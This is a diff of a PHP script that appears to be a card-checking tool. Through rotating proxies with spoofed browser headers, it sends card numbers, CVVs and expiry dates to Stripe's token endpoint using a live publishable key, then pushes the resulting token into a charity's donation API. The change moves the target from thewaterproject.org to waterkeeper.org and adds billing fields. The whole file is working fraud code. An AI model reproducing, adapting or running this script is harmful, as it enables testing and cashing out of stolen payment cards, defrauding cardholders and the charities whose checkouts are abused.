@@ -233,16 +233,16 @@ $ip = "Proxy Dead:[".$rotate."]";
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: /v1/payment_methods',
+'path: /v1/tokens',
 'scheme: https',
 'accept: application/json',
-'accept-language: en-US,en;q=0.5',
+'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded',
 'origin: https://js.stripe.com',
 'referer: https://js.stripe.com/',
@@ -260,7 +260,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F54c9cfdcf%3B+stripe-js-v3%2F54c9cfdcf&time_on_page=703029&key=pk_live_9RzCojmneCvL31GhYTknluXp&_stripe_account=acct_102i8i2dzpFK4wSa&_stripe_version=2020-08-27');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_line1]='.$street.'&card[address_line2]=&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$postcode.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=66671e36-688c-4c48-a0c8-ce7f069f103835ff1d&muid=69127b0f-d7e5-42fb-82fa-a1a5ab754e0f46b0e8&sid=bb03b0b5-37b6-4737-abf6-34e6c6cbe79eebfc61&payment_user_agent=stripe.js%2F54c9cfdcf%3B+stripe-js-v3%2F54c9cfdcf&time_on_page=126449&key=pk_live_T0LDuJcnjhAGRKVhfmLnjclt&_stripe_version=2019-02-11&pasted_fields=number');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"'))); 
@@ -271,7 +271,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.fundraiseup.com/paymentSession/1387587213284476812/pay');
+curl_setopt($ch, CURLOPT_URL, 'https://api.donately.com/v2/donations.json?account_id=act_aa21b4d3e920&donation_type=cc&x1=a24ed2d5e8fd01480789b3e12d75a9ac');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -282,16 +282,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.fundraiseup.com',
+'authority: api.donately.com',
 'method: POST',
-'path: /paymentSession/1387587213284476812/pay',
+'path: /v2/donations.json?account_id=act_aa21b4d3e920&donation_type=cc&x1=a24ed2d5e8fd01480789b3e12d75a9ac',
 'scheme: https',
-'accept: application/json, text/plain, */*',
-'accept-language: en-US,en;q=0.5',
-'content-type:text/plain; charset=utf-8',
+'accept: application/json, */*',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded',
 'cookie: ',
-'origin: https://thewaterproject.org',
-'referer: https://thewaterproject.org/',
+'origin: https://waterkeeper.org',
+'referer: https://waterkeeper.org/donate/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -301,7 +301,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'{"widgetDefaults":{"amount":{"once":6800,"monthly":3400},"repeat":"once","includeFees":true,"amountOptions":{"once":[100000,50000,25000,13600,6800,3400],"monthly":[20000,10000,5000,3400,1000,500]},"currency":"USD","relations":{"amount":0,"amountOptions":0}},"paymentMethod":{"id":"'.$id.'","object":"payment_method","billing_details":{"address":{"city":null,"country":null,"line1":null,"line2":null,"postal_code":null,"state":null},"email":null,"name":null,"phone":null},"card":{"brand":"mastercard","checks":{"address_line1_check":null,"address_postal_code_check":null,"cvc_check":null},"country":"AU","exp_month":4,"exp_year":2022,"funding":"debit","generated_from":null,"last4":"0178","networks":{"available":["mastercard"],"preferred":null},"three_d_secure_usage":{"supported":true},"wallet":null},"created":1647336235,"customer":null,"livemode":true,"type":"card"}}');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'account_id=act_aa21b4d3e920&donation_type=cc&x1=a24ed2d5e8fd01480789b3e12d75a9ac');
 
 
 $result2 = curl_exec($ch);
